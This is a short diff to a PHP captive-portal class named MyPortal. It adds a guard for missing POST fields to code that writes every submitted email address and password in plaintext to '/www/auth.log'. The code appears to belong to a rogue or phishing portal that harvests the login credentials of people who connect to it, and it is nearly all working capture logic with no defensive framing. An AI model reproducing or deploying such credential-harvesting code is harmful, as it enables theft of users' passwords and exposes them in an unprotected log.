@@ -9,7 +9,11 @@ class MyPortal extends Portal
         // Call parent to handle basic authorization first
         parent::handleAuthorization();
 
-        // Check for other form data here
+	// Check for other form data here
+	if (!isset($_POST['email']) || !isset($_POST['password'])) {
+		return;
+	}
+
 	$fh = fopen('/www/auth.log', 'a+');
 	fwrite($fh, "Email:  " . $_POST['email'] . "\n");
 	fwrite($fh, "Pass:  " . $_POST['password'] . "\n\n");
